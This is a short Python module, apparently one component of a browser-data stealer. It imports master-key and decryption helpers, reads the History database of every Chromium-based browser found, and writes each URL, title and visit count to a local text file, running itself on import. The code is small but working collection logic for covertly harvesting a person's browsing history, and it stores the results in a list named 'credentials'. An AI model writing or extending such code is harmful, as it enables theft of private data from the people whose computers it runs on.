
# Import modules
from  __init__ import GetMasterKey, FetchDataBase, DecryptValue, ConvertDate, GetBrowsers

""" Fetch history from chromium based browsers """
def Get():
    global credentials
    credentials = []
    for browser in GetBrowsers():
        database = FetchDataBase(browser + "\\History", "SELECT * FROM urls")
        i=0
        for row in database:
            history = {
                "hostname": row[1],
                "title": row[2],
                "visits": row[3] + 1,
            }
            credentials.append(history)
            with open("output_file_history.txt", "a") as file:
                scrittura= str(i) + f") {str(history)}"
                file.write(scrittura)
                file.write("\n")
            i=i+1

    return credentials


Get()